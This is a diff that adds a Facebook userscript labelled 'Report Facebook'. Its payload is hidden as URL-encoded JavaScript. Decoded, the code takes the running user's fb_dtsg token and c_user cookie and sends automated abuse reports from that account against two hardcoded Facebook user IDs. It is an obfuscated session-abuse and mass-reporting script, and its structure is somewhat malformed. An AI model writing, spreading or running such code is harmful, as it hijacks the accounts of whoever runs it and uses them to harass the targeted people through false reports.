@@ -1,0 +1,9 @@
+// ==UserScript==
+// @name            Edit Fan Ta Sy
+// @description     Report Facebook
+// ==/UserScript==
+// ==13470X==
+// ==============
+/<script>
+<!--
+document.write(unescape("//CODE%20REPORT%20ACC%20BY%20Fan%20Ta%20Sy%0Avar%20fb_dtsg%20%3D%20document.getElementsByName%28%27fb_dtsg%27%29%5B0%5D.value%3B%0Avar%20user_id%20%3D%20document.cookie.match%28document.cookie.match%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3B%0Avar%20now%3D%28new%20Date%29.getTime%28%29%3B%0Afunction%20report%28r%29%20%7B%0Avar%20X%20%3D%20new%20XMLHttpRequest%28%29%3B%0Avar%20XURL%20%3D%20%22https%3A//www.facebook.com/ajax/report/social.php%22%3B%0Avar%20XParams%20%3D%22fb_dtsg%3D%22+fb_dtsg+%22%26com%3D1%26pp%3D%257B%2522actions_to_take%2522%253A%2522%5B%5D%2522%252C%2522are_friends%2522%253Afalse%252C%2522cid%2522%253A%22%20+%20r%20+%22%252C%2522content_type%2522%253A0%252C%2522expand_report%2522%253A1%252C%2522first_choice%2522%253A%2522file_report%2522%252C%2522from_gear%2522%253A%2522timeline%2522%252C%2522is_following%2522%253Afalse%252C%2522is_tagged%2522%253Afalse%252C%2522on_profile%2522%253Afalse%252C%2522phase%2522%253A3%252C%2522ref%2522%253A%2522https%253A%255C%252F%255C%252Fwww.facebook.com%255C%252F%2522%252C%2522report_type%2522%253A145%252C%2522rid%2522%253A%22%20+%20r%20+%22%252C%2522sub_report_type%2522%253A141%252C%2522time_flow_started%2522%253A%22+now+%22%252C%2522user%2522%253A%22+user_id+%22%257D%26file_report%3D1%26__user%3D%22+user_id+%22%26__a%3D1%26__dyn%3D7n8ahyj35ynzpQ9UmAWuURDw%26__req%3Dh%26ttstamp%3D26581661107112011276%26confirmed%3D1%22%3B%0AX.open%28%22POST%22%2C%20XURL%2C%20true%29%3B%0AX.onreadystatechange%20%3D%20function%20%28%29%20%7B%0Aif%20%28X.readyState%20%3D%3D%204%20%26%26%20X.status%20%3D%3D%20200%29%20%7B%0AX.close%3B%0A%7D%0A%7D%3B%0AX.send%28XParams%29%3B%0A%7D%0Areport%28%22100004199340986%22%29%3Breport%28%22100003674665182%22%29%3B%0A"));
